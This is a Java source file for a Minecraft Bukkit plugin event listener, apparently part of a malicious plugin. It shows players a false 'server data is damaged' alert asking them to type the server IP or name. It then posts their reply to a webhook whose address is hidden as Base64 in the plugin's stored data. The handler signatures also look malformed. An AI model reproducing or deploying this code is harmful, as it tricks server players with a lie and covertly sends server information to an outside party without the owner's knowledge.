package me.system.runner.events;

import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import me.system.runner.methods.onEnable;
import me.system.runner.methods.onEnableLogger;
import me.system.runner.utils.DWeb;

import java.util.Base64;

public class IPGetterPlayerVise
implements Listener {

    public static Boolean ready_for_action = false;

    @EventHandler
    void playerJoinedOnIP(PlayerJoinEvent e, Player p2) {
        Player player = e.getPlayer();
        String the_player_joined = player.getName();
        if (onEnableLogger.unknown_host == true) {
            p2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&cALERT! Server Info and Data Is Damaged! Please enter the server name or IP in chat immediately to fix problems! (Enter Server IP Or Name As Next Chat Message You Send)!"));
            ready_for_action = true;
        }
    }

    @EventHandler
    void playerRepliedToRequest(AsyncPlayerChatEvent e, Player p2) {
        if (onEnableLogger.unknown_host == true) {
            if (ready_for_action == true) {
                byte[] u2 = Base64.getDecoder().decode(DataManager.getData().getString("mywh"));
                DWeb webhook = new DWeb(new String(u2));
                webhook.setContent("Tried to get server IP/Server Name from a user (Could Be Minehut Server)! - " + e.getMessage());
                ready_for_action = false;
                onEnableLogger.unknown_host = false;
            }
        }
    }
}
